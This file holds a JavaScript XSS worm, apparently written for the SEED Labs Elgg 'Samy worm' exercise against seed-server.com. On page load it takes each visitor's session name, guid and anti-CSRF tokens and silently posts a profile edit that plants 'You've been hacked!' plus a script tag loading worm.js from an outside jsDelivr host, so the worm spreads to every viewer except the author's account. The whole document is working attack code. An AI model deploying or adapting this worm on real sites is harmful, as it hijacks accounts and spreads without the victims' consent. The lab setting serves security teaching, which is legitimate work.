window.onload = function() {
    // Access user details and tokens
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Construct the worm script link
    var wormScriptTag = "<script src='https://cdn.jsdelivr.net/gh/mehtaaryan1999/lecture0/worm.js'></" + "script>";

    // Construct the content to modify the profile
    var profileUpdateContent = token + ts + userName + guid + "&description=You’ve been hacked! " + encodeURIComponent(wormScriptTag) + "&accesslevel[description]=2";

    // URL to modify the profile
    var profileUpdateUrl = "http://www.seed-server.com/action/profile/edit";

    // Ensure this does not execute on Samy's profile
    if (elgg.session.user.guid != 59) {
        // Send profile update request
        var modifyProfileRequest = new XMLHttpRequest();
        modifyProfileRequest.open("POST", profileUpdateUrl, true);
        modifyProfileRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        modifyProfileRequest.send(profileUpdateContent);
    }
}
